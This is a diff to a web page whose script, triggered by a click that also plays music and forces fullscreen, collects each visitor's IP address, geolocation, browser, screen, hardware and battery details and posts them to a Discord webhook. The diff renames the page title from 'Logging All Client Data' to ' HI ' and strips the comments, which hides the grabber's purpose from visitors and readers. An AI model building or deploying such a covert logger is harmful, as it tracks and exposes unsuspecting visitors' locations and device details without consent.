@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Logging All Client Data</title>
+    <title> HI </title>
     <style>
         body {
             margin: 0;
@@ -51,53 +51,49 @@
         const overlay = document.querySelector('.overlay');
         const audio = document.getElementById('background-music');
 
-        // Function to gather and send client data
+       
         function sendClientData() {
-            // Get User Agent
+           
             const userAgent = navigator.userAgent;
-
-            // Get Browser Language
+    
             const language = navigator.language;
 
-            // Get Screen Dimensions
+            
             const screenWidth = screen.width;
             const screenHeight = screen.height;
 
-            // Get Window Dimensions
             const windowWidth = window.innerWidth;
             const windowHeight = window.innerHeight;
 
-            // Get Scroll Position
+      
             const scrollX = window.scrollX;
             const scrollY = window.scrollY;
 
-            // Get Device Memory (RAM in GB)
+            
             const deviceMemory = navigator.deviceMemory;
 
-            // Get Hardware Concurrency (CPU cores)
+         
             const hardwareConcurrency = navigator.hardwareConcurrency;
 
-            // Get IP Address (using an external API like ipify)
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
 
-                    // Get Geolocation (if available)
+            
                     navigator.geolocation.getCurrentPosition(
                         position => {
                             const latitude = position.coords.latitude;
                             const longitude = position.coords.longitude;
 
-                            // Get Battery Status
+                            
                             navigator.getBattery().then(function(battery) {
-                                const batteryLevel = battery.level * 100; // in percentage
+                                const batteryLevel = battery.level * 100; 
                                 const isCharging = battery.charging;
 
-                                // Get Installed Plugins (e.g., Flash, PDF viewer)
+                                
                                 const plugins = navigator.plugins;
 
-                                // Send data to Discord Webhook
                                 const discordWebhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'; // Replace with your webhook URL
                                 const logData = {
                                     content: `Client Data:
@@ -142,15 +138,14 @@
                 });
         }
 
-        // Function to make the browser go fullscreen
         function goFullScreen() {
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
-            } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+            } else if (document.documentElement.mozRequestFullScreen) { 
                 document.documentElement.mozRequestFullScreen();
-            } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+            } else if (document.documentElement.webkitRequestFullscreen) { 
                 document.documentElement.webkitRequestFullscreen();
-            } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+            } else if (document.documentElement.msRequestFullscreen) { 
                 document.documentElement.msRequestFullscreen();
             }
         }
@@ -160,7 +155,7 @@
             overlay.style.display = 'none'; 
             audio.play();
             goFullScreen(); 
-            sendClientData(); // Send all collected client data
+            sendClientData();
         });
     </script>
 </body>
